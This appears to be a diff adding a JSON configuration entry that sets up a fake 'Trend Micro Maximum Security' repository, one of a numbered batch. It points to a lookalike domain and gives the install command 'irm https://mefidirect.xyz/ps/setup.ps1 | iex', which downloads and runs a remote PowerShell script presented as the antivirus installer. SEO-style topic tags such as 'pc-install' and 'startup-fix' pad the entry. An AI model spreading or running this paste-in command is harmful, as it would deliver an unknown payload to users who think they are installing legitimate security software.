@@ -1,0 +1,29 @@
+{
+  "repo": "trend-micro-maximum-security",
+  "product": "Trend Micro Maximum Security",
+  "kind": "security",
+  "install_type": "download",
+  "download_url": "https://trend-micro.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "security",
+  "topics": [
+    "trend-micro-bundle",
+    "trend-micro-platform",
+    "trend-micro-antivirus-software",
+    "trend-micro-64-bit",
+    "trend-micro-startup-fix",
+    "trend-micro-pc-install",
+    "trend-micro-malware-protection",
+    "trend-micro-workbench",
+    "trend-micro-user-guide",
+    "trend-micro-manual-2026",
+    "trend-micro-installer",
+    "system-utility",
+    "pc-utility",
+    "setup-guide",
+    "antivirus-tools"
+  ]
+}
